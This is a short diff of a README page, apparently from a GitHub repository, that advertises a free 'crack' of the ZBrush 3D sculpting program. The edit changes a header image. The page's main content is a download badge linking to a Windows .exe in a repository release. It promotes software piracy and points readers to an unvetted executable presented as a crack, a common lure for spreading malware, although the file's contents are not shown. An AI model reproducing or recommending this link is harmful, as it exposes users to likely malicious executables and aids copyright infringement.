@@ -3,7 +3,7 @@
 
 <h1>ZBrush: Unleash Your Creativity with Advanced Digital Sculpting</h1>
 
-<p dir="ltr"><img src="![image](https://github.com/user-attachments/assets/809ca7da-462c-4958-92c7-1c742836bb1f)
+<p dir="ltr"><img src="![image](https://cdn.prod.website-files.com/615e05a19db5888071c7cff5/630314062ce7695941bfb52e_How-to-record-a-clean-timelapse-in-ZBrush.jpg)
 " alt="ZBrush" style="max-width: 100%;"></p> <!-- Replace with a real ZBrush image -->
 
 [<img src="https://img.shields.io/badge/ZBRUSHPRO_CRACK-DOWNLOAD-blue?style=for-the-badge">](https://github.com/arsham129/Zbrush-Full-2024-2025/releases/download/2/ZBrush-Full-2024-2025.exe)
